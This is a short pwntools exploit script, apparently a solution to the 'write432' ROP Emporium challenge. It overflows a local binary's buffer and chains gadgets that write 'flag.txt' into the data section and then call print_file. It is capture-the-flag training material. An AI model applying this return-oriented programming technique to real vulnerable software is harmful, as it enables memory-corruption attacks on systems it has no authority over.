from pwn import *

sh = process("./write432")

# gadget
pop_edi_ebp = 0x080485aa
mov_addr_edi_ebp  = 0x08048543
# data address
data_pos = 0x0804a018
# print_file address
print_file = 0x080483d0
# payload
payload = b'a'*40 + p32(0xdeadbeef) + p32(pop_edi_ebp) + p32(data_pos) + b'flag' + p32(mov_addr_edi_ebp)
payload += p32(pop_edi_ebp) + p32((data_pos)+4) +  b'.txt' + p32(mov_addr_edi_ebp)
payload += p32(print_file) + p32(0xdeadbeef) + p32(data_pos)

sh.sendline(payload)
sh.interactive()
